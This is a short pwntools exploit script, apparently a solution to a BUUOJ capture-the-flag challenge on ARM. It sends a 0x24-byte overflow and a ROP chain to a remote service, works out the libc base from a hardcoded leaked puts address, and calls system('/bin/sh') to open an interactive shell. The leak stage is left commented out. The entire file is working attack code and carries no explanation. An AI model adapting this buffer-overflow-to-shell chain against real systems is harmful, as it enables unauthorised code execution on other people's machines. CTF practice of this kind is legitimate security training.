from pwn import *
context.log_level = 'debug'
#p = process("./1")
p = remote("node1.buuoj.cn", 28415)
elf = ELF("./1")
libc = ELF("./ld-linux.so.3")

pop_r45678_sb_sl_pc = 0x10638
pop_r3_pc = 0x103a4
mov_r0_blx_r3 = 0x10628
'''
p.recv()
payload = 'a'*0x24+p32(pop_r45678_sb_sl_pc)+p32(0)*3+p32(elf.got['puts'])+p32(0)*3+p32(pop_r3_pc)+p32(elf.plt['puts'])+p32(mov_r0_blx_r3)

p.sendline(payload)
p.recvline()
puts_addr = u32(p.recv(4))
success("puts_addr ==> "+ hex(puts_addr))
''' 
puts_addr = 0xf66e7770
libc_base = puts_addr - libc.sym['puts']
system = libc_base + libc.sym['system']
binsh = libc_base + libc.search("/bin/sh").next()

payload = 'a'*0x24+p32(pop_r45678_sb_sl_pc)+p32(0)*3+p32(binsh)+p32(0)*3+p32(pop_r3_pc)+p32(system)+p32(mov_r0_blx_r3)
p.sendline(payload)
p.interactive()


